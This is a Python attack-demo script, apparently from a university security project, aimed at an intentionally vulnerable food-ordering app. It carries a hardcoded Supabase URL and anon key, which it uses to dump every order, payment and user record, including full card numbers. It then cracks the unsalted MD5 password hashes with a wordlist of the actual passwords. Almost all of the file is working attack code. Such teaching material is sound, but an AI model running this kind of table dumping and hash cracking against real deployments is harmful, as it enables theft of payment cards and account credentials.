#!/usr/bin/env python3
"""
A02: Cryptographic Failures -- Automated Attack Demo
====================================================
CraveKart University Security Project

Demonstrates 4 cryptographic failure vectors:
  1. Plaintext Card in Orders     -- orders.cc_number stores full PAN
  2. Plaintext Card in Payments   -- payments.cc_number stores full PAN
  3. Weak Hashing (Users)         -- users.password_md5 is unsalted MD5
  4. Weak Hashing (Legacy)        -- legacy_accounts.password_hash is unsalted MD5

Usage:
    py scripts/a02_cryptographic_failures.py [BASE_URL]

    BASE_URL defaults to http://localhost:3000
"""

import sys
import hashlib
import json
import requests

# -- Config ------------------------------------------------------------------

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
SUPABASE_URL = "https://xcjgpffjfeoydsevivrr.supabase.co"
ANON_KEY = "sb_publishable_9SKE0PoVf78Ew2DP32AvLw_3xOqi4aD"

# Small demo wordlist for MD5 cracking (these are the actual passwords)
WORDLIST = [
    "admin123", "password123", "priya123", "alex123", "owner123",
    "letmein2026", "guestpass1", "password", "letmein", "admin",
    "qwerty", "123456", "iloveyou", "trustno1", "sunshine",
    "princess", "football", "charlie", "shadow", "michael",
    "hello", "password1", "welcome", "monkey", "dragon",
    "master", "qwerty123", "login", "abc123", "passw0rd",
    "nirmauni31", "nirmauni36", "alpesh123", "khushi123",
]

# -- Helpers -----------------------------------------------------------------

RESET  = "\033[0m"
BOLD   = "\033[1m"
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
DIM    = "\033[2m"

session = requests.Session()


def banner(num, title):
    print()
    print("=" * 70)
    print("  ATTACK {}: {}".format(num, title))
    print("=" * 70)
    print()


def vuln(msg):
    print("  {}[VULN] {}{}".format(BOLD + RED, msg, RESET))


def info(msg):
    print("  {}{}{}".format(DIM, msg, RESET))


def ok(msg):
    print("  {}{}{}".format(GREEN, msg, RESET))


def warn(msg):
    print("  {}{}{}".format(YELLOW, msg, RESET))


def md5_hex(plaintext):
    return hashlib.md5(plaintext.encode("utf-8")).hexdigest()


def crack_md5(target_hash, wordlist):
    """Try to crack an unsalted MD5 hash using a wordlist."""
    target = target_hash.lower().strip()
    for word in wordlist:
        if md5_hex(word) == target:
            return word
    return None


# -- Attack 1: Plaintext Card Numbers in Orders ------------------------------

def attack_plaintext_cards_orders():
    banner(1, "Plaintext Card Storage in orders.cc_number")
    info("Checkout stores the FULL credit card number in plaintext.")
    info("The checkout API (app/api/checkout/route.ts) line 49:")
    info('  cc_number: String(card.number),')
    info("No encryption, no masking, no tokenization.")
    print()

    # First, create a new order with a test card to prove checkout stores it
    info("--- Proving checkout stores plaintext card ---")
    print()
    print("  {}POST{} /api/checkout".format(BOLD, RESET))
    info("  Payload includes card.number = '4111111111111111'")
    print()

    checkout_payload = {
        "items": [
            {
                "id": "00000000-0000-4000-a000-000000000001",
                "name": "Margherita Pizza",
                "price": 189,
                "qty": 1,
                "restaurant_id": "00000000-0000-4000-9000-000000000001",
                "restaurant_name": "Pizza Palace",
            }
        ],
        "card": {
            "number": "4111111111111111",
            "expiry": "12/28",
            "cvv": "123",
            "name": "Test Victim",
        },
        "email": "victim@test.com",
        "delivery_address": "123 Vulnerable St, Insec城",
        "user_id": "00000000-0000-0000-0000-000000000000",
    }

    r = session.post("{}/api/checkout".format(BASE), json=checkout_payload)
    data = r.json()

    if r.status_code == 200 or r.status_code == 201:
        order = data.get("order", {})
        ok("  Order created: #{}".format(order.get("id")))
        ok("  Card stored as: {}".format(order.get("cc_number", "N/A")))
        print()
        if order.get("cc_number") == "4111111111111111":
            vuln("Full PAN stored in plaintext in orders table!")
    else:
        warn("  Checkout returned HTTP {}: {}".format(r.status_code, data.get("error", "?")))

    print()

    # Now read ALL orders to show stored card numbers
    info("--- Reading all stored card numbers via IDOR ---")
    print()

    headers_anon = {
        "apikey": ANON_KEY,
        "Authorization": "Bearer {}".format(ANON_KEY),
    }

    r = session.get(
        "{}/rest/v1/orders?select=id,cc_number,total,restaurant_name&order=id".format(SUPABASE_URL),
        headers=headers_anon,
    )
    orders = r.json()

    print("  {:<8s} {:<20s} {:>8s} {:<20s}".format("ORDER", "RESTAURANT", "TOTAL", "PLAINTEXT CARD"))
    print("  {:<8s} {:<20s} {:>8s} {:<20s}".format("------", "--------------------", "--------", "--------------------"))

    for o in orders:
        print("  #{:<7d} {:<20s} Rs.{:<5} {}".format(
            o.get("id", 0),
            o.get("restaurant_name", "?")[:20],
            o.get("total", 0),
            o.get("cc_number", "N/A")
        ))

    print()
    vuln("{} orders contain full plaintext credit card numbers.".format(len(orders)))
    vuln("Anyone with the anon key can read them via Supabase REST API.")
    print()


# -- Attack 2: Plaintext Card Numbers in Payments ---------------------------

def attack_plaintext_cards_payments():
    banner(2, "Plaintext Card Storage in payments.cc_number")
    info("The payments table ALSO stores the full card number in plaintext.")
    info("app/api/checkout/route.ts line 93:")
    info('  cc_number: String(card.number),')
    print()

    headers_anon = {
        "apikey": ANON_KEY,
        "Authorization": "Bearer {}".format(ANON_KEY),
    }

    r = session.get(
        "{}/rest/v1/payments?select=id,order_id,amount,card_brand,card_last4,cc_number,status&order=id".format(SUPABASE_URL),
        headers=headers_anon,
    )
    payments = r.json()

    print("  {:<6s} {:<8s} {:>8s} {:<14s} {:<20s}".format("PAY#", "ORDER", "AMOUNT", "BRAND", "PLAINTEXT CARD"))
    print("  {:<6s} {:<8s} {:>8s} {:<14s} {:<20s}".format("------", "------", "--------", "--------------", "--------------------"))

    for p in payments:
        print("  #{:<5d} #{:<7d} Rs.{:<5} {:<14s} {}".format(
            p.get("id", 0),
            p.get("order_id", 0),
            p.get("amount", 0),
            p.get("card_brand", "?"),
            p.get("cc_number", "N/A")
        ))

    print()
    ok("  GET {}/rest/v1/payments".format(SUPABASE_URL))
    ok("  Headers: apikey={}, Authorization=Bearer {}".format(ANON_KEY[:20] + "...", ANON_KEY[:20] + "..."))
    print()
    vuln("{} payment records with full plaintext card numbers.".format(len(payments)))
    vuln("The card_last4 field exists but is USELESS when the full PAN is right next to it.")
    print()


# -- Attack 3: Weak Hashing -- users.password_md5 ---------------------------

def attack_weak_hashing_users():
    banner(3, "Weak Hashing -- users.password_md5 (Unsalted MD5)")
    info("The users table stores passwords as unsalted MD5 hashes.")
    info("MD5 is broken: no salt, no iterations, GPU-crackable at billions/sec.")
    print()

    headers_anon = {
        "apikey": ANON_KEY,
        "Authorization": "Bearer {}".format(ANON_KEY),
    }

    r = session.get(
        "{}/rest/v1/users?select=email,role,password_md5&password_md5=not.is.null&order=email".format(SUPABASE_URL),
        headers=headers_anon,
    )
    users = r.json()

    info("  Hash algorithm: MD5 (no salt, single iteration)")
    info("  Hash format:    hex(md5(plaintext_password))")
    info("  Cracking speed: ~10 billion hashes/sec on modern GPU")
    print()

    print("  {:<40s} {:<18s} {:<36s} {}".format("EMAIL", "ROLE", "MD5 HASH", "CRACKED"))
    print("  {:<40s} {:<18s} {:<36s} {}".format("----------------------------------------", "------------------", "------------------------------------", "--------"))

    cracked_count = 0
    for u in users:
        email = u.get("email", "?")
        role = u.get("role", "?")
        md5 = u.get("password_md5", "")
        cracked = crack_md5(md5, WORDLIST) if md5 else None
        if cracked:
            cracked_count += 1
            status = "{}{}{}".format(GREEN, cracked, RESET)
        else:
            status = "{}(not in wordlist){}".format(YELLOW, RESET)
        print("  {:<40s} {:<18s} {:<36s} {}".format(email, role, md5[:36], status))

    print()
    ok("  Cracked {}/{} hashes using a {}-word dictionary.".format(cracked_count, len(users), len(WORDLIST)))
    print()

    if cracked_count > 0:
        vuln("Unsalted MD5 is trivially reversible with rainbow tables or GPUs.")
        vuln("An attacker dumps this table and cracks every hash in seconds.")
    print()

    # Show the code that stores it
    info("  Code that stores the hash (app/api/register/route.ts):")
    info("    password_md5: createHash('md5').update(password).digest('hex')")
    info("  No salt. No bcrypt. No argon2. Just raw MD5.")
    print()


# -- Attack 4: Weak Hashing -- legacy_accounts -------------------------------

def attack_weak_hashing_legacy():
    banner(4, "Weak Hashing -- legacy_accounts.password_hash (Unsalted MD5)")
    info("A second auth store uses the same broken MD5 scheme.")
    info("migration 003_legacy_accounts.sql creates this table and seeds it")
    info("with guest passwords hashed via PostgreSQL's md5() function.")
    print()

    headers_anon = {
        "apikey": ANON_KEY,
        "Authorization": "Bearer {}".format(ANON_KEY),
    }

    r = session.get(
        "{}/rest/v1/legacy_accounts?select=guest_email,password_hash,created_at&order=guest_email".format(SUPABASE_URL),
        headers=headers_anon,
    )
    accounts = r.json()

    if not accounts:
        warn("  No legacy_accounts found (table may not exist yet).")
        info("  Run the migration: supabase/migrations/20260814000003_legacy_accounts.sql")
        print()
        return

    info("  Algorithm: PostgreSQL md5() -- same as users.password_md5")
    info("  Migration inserts passwords in plaintext: md5('guestpass1')")
    print()

    print("  {:<30s} {:<36s} {}".format("GUEST EMAIL", "MD5 HASH", "CRACKED"))
    print("  {:<30s} {:<36s} {}".format("------------------------------", "------------------------------------", "--------"))

    cracked_count = 0
    for a in accounts:
        email = a.get("guest_email", "?")
        pw_hash = a.get("password_hash", "")
        cracked = crack_md5(pw_hash, WORDLIST) if pw_hash else None
        if cracked:
            cracked_count += 1
            status = "{}{}{}".format(GREEN, cracked, RESET)
        else:
            status = "{}(not in wordlist){}".format(YELLOW, RESET)
        print("  {:<30s} {:<36s} {}".format(email, pw_hash, status))

    print()
    ok("  Cracked {}/{} legacy account hashes.".format(cracked_count, len(accounts)))
    print()

    if cracked_count > 0:
        vuln("Legacy guest accounts use unsalted MD5 -- same weakness as users table.")
        vuln("An attacker with DB access cracks all guest passwords instantly.")
    print()

    # Show the actual migration code
    info("  Migration code (003_legacy_accounts.sql):")
    info("    insert into public.legacy_accounts (guest_email, password_hash) values")
    info("    ('guest1@cravekart.app', md5('guestpass1')),")
    info("    ('guest2@cravekart.app', md5('letmein2026')),")
    info("    ('guest3@cravekart.app', md5('password123'))")
    print()
    info("  The passwords are LITERALLY in the migration file.")
    info("  Even without cracking, an attacker just reads the SQL.")
    print()


# -- Main --------------------------------------------------------------------

def main():
    print()
    print("#" * 70)
    print("  A02: Cryptographic Failures -- Automated Attack Script")
    print("  Target: {}".format(BASE))
    print("  Supabase: {}".format(SUPABASE_URL))
    print("#" * 70)

    attacks = [
        attack_plaintext_cards_orders,
        attack_plaintext_cards_payments,
        attack_weak_hashing_users,
        attack_weak_hashing_legacy,
    ]

    for attack in attacks:
        try:
            attack()
        except requests.ConnectionError:
            print()
            print("  [ERROR] Could not connect to {}".format(BASE))
            print("  Make sure the dev server is running: npm run dev --webpack")
            print()
            sys.exit(1)
        except Exception as e:
            print()
            print("  [ERROR] {}".format(e))
            print()

    print("=" * 70)
    print("  ALL 4 ATTACKS COMPLETED")
    print("=" * 70)
    print()
    print("  Summary of A02 Cryptographic Failures in CraveKart:")
    print()
    print("  1. Plaintext PANs in orders.cc_number    -- no encryption at rest")
    print("  2. Plaintext PANs in payments.cc_number  -- duplicated, also clear")
    print("  3. Unsalted MD5 in users.password_md5    -- GPU-crackable in seconds")
    print("  4. Unsalted MD5 in legacy_accounts       -- passwords in SQL migration")
    print()
    print("  These are INTENTIONAL vulnerabilities for your university demo.")
    print()


if __name__ == "__main__":
    main()
